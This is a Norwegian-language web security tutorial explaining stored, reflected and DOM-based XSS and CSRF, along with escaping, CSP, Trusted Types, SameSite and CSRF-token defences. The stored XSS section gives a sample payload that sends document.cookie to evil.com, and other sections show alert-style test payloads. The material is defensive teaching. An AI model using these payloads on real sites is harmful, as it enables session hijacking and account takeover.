XSS og CSRF

Skriptet som sitter i databasen og venter på alle som åpner siden — og forespørselen nettleseren sender uten å spørre brukeren.

01 · Stored XSS

Stored XSS

Det ondsinnede skriptet lagres i databasen og kjøres for alle brukere som ser innholdet — angrepet skalerer av seg selv.

Et kommentarfelt på en blogg. En angriper skriver ikke «Flott innlegg!» — angriperen skriver <script>fetch('https://evil.com/steal?c='+document.cookie)</script>. Kommentaren lagres i databasen. Neste gang siden lastes — for deg, for administratoren, for alle — kjøres skriptet i nettleseren og sender session-cookien til angriperen.

Stored XSS er den farligste varianten fordi den ikke krever at offeret klikker en spesiell lenke — det holder å besøke siden. Og fordi administrasjonsgrensesnitt ofte viser brukerinnhold, er adminsesjonskompromittering et klassisk mål.

02 · Reflected XSS

Reflected XSS

Payloaden lever i URL-en og «reflekteres» tilbake i svaret — offeret må lures til å klikke lenken.

Et søkefelt returnerer «Du søkte på: søkeord» uten å escape søkeordet. En angriper konstruerer en URL som /search?q=<script>...</script> og sender den til offeret via phishing. Nettleseren laster siden, serveren reflekterer payloaden i HTML-en, og skriptet kjøres.

<!-- Sårbar: søkeord satt inn direkte i HTML -->
Du søkte på: {{ søkeord }}

<!-- Sikker: auto-escaping i Jinja2 -->
Du søkte på: {{ søkeord | e }}

<!-- Eller: bruk textContent i JavaScript, aldri innerHTML -->
document.getElementById('result').textContent = søkeord;

Reflected XSS er enkelt å teste for: søk etter <script>alert(1)</script> og se om dialogboksen dukker opp. Automatiserte scannere som OWASP ZAP oppdager det for deg. Likevel er det fortsatt svært vanlig.

03 · DOM-basert XSS

DOM-basert XSS

Angrepet skjer helt i nettleseren — serveren ser aldri payloaden, og server-side sanitering hjelper ikke.

JavaScript leser location.hash for å vise en velkomstmelding: document.getElementById('greeting').innerHTML = location.hash.slice(1). En angriper sender lenken /page#<img src=x onerror=alert(1)>. Fragmentet sendes aldri til serveren — det bor i nettleseren. innerHTML parser og kjører det.

Sinkene du alltid skal behandle med mistenksomhet:

  • element.innerHTML, element.outerHTML
  • document.write(), document.writeln()
  • eval(), setTimeout(string), setInterval(string)
  • element.setAttribute('href', ...), element.src = ...

Løsning

Bruk textContent fremfor innerHTML for ren tekst. Bruk Trusted Types API for å tvinge gjennom sikre sinkoperasjoner. DOMPurify for situasjoner der du faktisk trenger å sette HTML fra brukerkontrollert kilde.

04 · CSRF

Cross-Site Request Forgery

Nettleseren sender cookies automatisk — og angriperen utnytter det til å la offeret utføre handlinger de ikke vet om.

Du er innlogget på banken din i én fane. I en annen fane åpner du en ondsinnet side som inneholder en skjult form som POSTer til bankens overføringsskjema. Nettleseren din sender automatisk med bankens session-cookie. Banken ser en autentisert forespørsel og utfører overføringen — uten at du vet det.

CSRF rammer alt som endrer tilstand på serveren via en forespørsel med cookies: passordendring, e-postendring, overføringer, slettinger.

Fix: CSRF-token-validering

En angriper kan tvinge nettleseren til å sende cookies, men kan ikke lese innholdet i en respons fra et annet domene (same-origin policy). Vi utnytter dette: server legger en uforutsigbar token inn i hver state-endrende form, og krever at samme token kommer tilbake i request body. Angriperens evil.com kan ikke lese tokenet, og kan dermed ikke konstruere en gyldig forespørsel.

<!-- Django-template med innebygd csrf_token -->
<form method="post" action="/overfør">
  {% csrf_token %}
  <input name="beløp" type="number">
  <input name="til" type="text">
  <button>Overfør</button>
</form>

# Express + csurf middleware
app.use(csrf());
app.get('/overfør-form', (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});
05 · Forsvar

Forsvar mot XSS og CSRF

Kontrollene for de to angrepene er forskjellige, men begge kan settes opp med kjente HTTP-mekanismer.

For XSS er den primære løsningen output-escaping: all brukerkontrollert data som settes inn i HTML-kontekst må escapes for HTML-entiteter. For JavaScript-kontekst brukes JSON-encoding. For URL-kontekst brukes URL-encoding. Det finnes ingen kontekst der rå brukerkontrollert input er trygt å sette inn direkte.

XSS-forsvar

  • Output-escaping: bruk mal-motorens auto-escape (Jinja2, React, Angular gjør dette som standard).
  • HttpOnly: session-cookies er ikke lesbare fra JavaScript.
  • Content-Security-Policy (CSP): begrens hvilke script-kilder som er tillatt. Content-Security-Policy: default-src 'self'; script-src 'self' blokkerer inline scripts og scripts fra andre domener.
  • Trusted Types: tvinger kode til å bruke eksplisitte saniterings-API-er for DOM-manipulasjon.

CSRF-forsvar

  • CSRF-token: server genererer uforutsigbar token per sesjon, legger den i skjult felt, validerer ved mottak.
  • SameSite=Strict: nettleseren sender aldri cookien med cross-site-forespørsler.
  • Double Submit Cookie: token sendes både som cookie og i request body/header — cross-site kode kan ikke lese cookien.
  • Verifiser Origin/Referer-header: sekundær kontroll.

Kombinasjonen som holder

HttpOnly + SameSite=Strict + CSP + CSRF-token. Ingen av dem er tilstrekkelig alene; alle fire gir et robust forsvar.
